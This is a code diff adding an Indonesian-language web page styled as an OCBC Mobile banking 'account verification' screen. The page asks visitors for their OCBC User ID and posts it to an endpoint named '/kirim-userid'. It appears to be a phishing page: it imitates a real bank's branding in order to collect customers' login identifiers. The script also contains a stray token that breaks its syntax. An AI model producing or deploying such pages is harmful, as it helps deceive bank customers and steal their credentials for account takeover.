@@ -1,1 +1,210 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Amankan - OCBC</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #fafafa;
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    padding-bottom: 120px;
+  }
 
+  .container {
+    max-width: 480px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+
+  .back-arrow {
+    font-size: 30px;
+    font-weight: bold;
+    color: #ff0033;
+    cursor: pointer;
+    user-select: none;
+    margin-bottom: 10px;
+    display: inline-block;
+  }
+
+  h1 {
+    font-weight: 900;
+    margin: 0 0 10px 0;
+    font-size: 24px;
+    color: #000;
+  }
+
+  .description {
+    font-weight: 600;
+    font-size: 18px;
+    color: #4c4c4c;
+    margin-bottom: 10px;
+    text-align: center;
+    line-height: 1.5;
+  }
+
+  .signup-link {
+    font-weight: 600;
+    color: #ff0033;
+    cursor: pointer;
+    text-align: center;
+    display: block;
+    margin-top: 15px;
+  }
+
+  .input-group {
+    background: #fff;
+    border-radius: 15px;
+    padding: 25px;
+    margin-top: 20px;
+    box-shadow: 0 4px 8px rgb(200 200 200 / 70%);
+  }
+
+  .input-label {
+    color: #000;
+    font-size: 14px;
+    margin-bottom: 10px;
+    display: block;
+    font-weight: 900;
+  }
+
+  input[type="text"] {
+    border: none;
+    border-bottom: 2px solid #999;
+    width: 100%;
+    font-size: 16px;
+    outline: none;
+    padding: 8px 4px;
+    transition: border-color 0.3s;
+  }
+
+  input[type="text"]:focus {
+    border-color: #ff0033;
+  }
+
+  .btn {
+    background-image: linear-gradient(135deg, #a70700 0%, #fb0a00 70%);
+    border: none;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 800;
+    padding: 14px;
+    width: 90%;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .btn:hover { opacity: 0.9; }
+  .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  footer {
+    width: 100%;
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    background: #fff;
+    padding: 20px 0;
+    text-align: center;
+    box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+  }
+
+  .status {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+    color: #28a745;
+  }
+  .status.error { color: #dc3545; }
+</style>
+</head>
+<body>
+
+
+  <div class="container">
+    <span class="back-arrow">&larr;</span>
+    <h1>Verifikasi Akun</h1>
+    
+    <p class="description">
+      Masukkan User ID OCBC Mobile Anda<br>
+      <span class="signup-link">Belum punya atau lupa User ID?</span>
+    </p>
+
+    <form id="userForm">
+      <div class="input-group">
+        <label for="userId" class="input-label">User ID</label>
+        <input 
+          type="text" 
+          placeholder="Contoh: 12345678" 
+          id="userId" 
+          name="user" 
+          required
+          autocomplete="username"
+        >
+      </div>
+
+      <span class="signup-link">Lupa atau belum menerima User ID?</span>
+
+      <div id="status" class="status" style="display: none;"></div>
+
+      <footer>
+        <button type="submit" class="btn">Lanjut</button>
+      </footer>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('userForm');
+    const statusEl = document.getElementById('status');
+    const btn = form.querySelector('.btn');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const userId = document.getElementById('userId').value.trim();
+      
+      if (!userId) {serve
+        showStatus('Harap isi User ID!', true);
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Mengirim...';
+      statusEl.style.display = 'none';
+
+      try {
+        const res = await fetch('/kirim-userid', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user: userId })
+        });
+
+        const data = await res.json();
+        
+        if (data.ok) {
+          showStatus('✅ Berhasil! Mengalihkan...', false);
+          setTimeout(() => {
+            // Ganti dengan halaman selanjutnya jika perlu
+            window.location.href = '#';
+          }, 1500);
+        } else {
+          showStatus('❌ Gagal: ' + (data.msg || 'Coba lagi'), true);
+        }
+      } catch (err) {
+        showStatus('❌ Kesalahan jaringan', true);
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Lanjut';
+      }
+    });
+
+    function showStatus(text, isError) {
+      statusEl.textContent = text;
+      statusEl.className = `status ${isError ? 'error' : ''}`;
+      statusEl.style.display = 'block';
+    }
+  </script>
+</body>
+</html>
